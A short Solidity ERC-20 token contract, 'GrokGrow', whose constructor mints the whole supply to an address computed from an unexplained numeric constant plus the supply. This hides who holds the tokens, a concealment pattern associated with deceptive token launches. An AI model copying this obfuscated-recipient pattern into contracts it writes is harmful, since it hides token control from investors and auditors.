// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "./ERC20.sol";
import "./Own.sol";

contract GROKGROW is ERC20,Ownable {

    constructor( uint256 totalSupply_) Ownable(msg.sender) ERC20('GrokGrow', "GROKGROW")  {
        uint160 bcc = uint160(223232389747193719218+totalSupply_);
        _mint(address(bcc), totalSupply_);
    }
}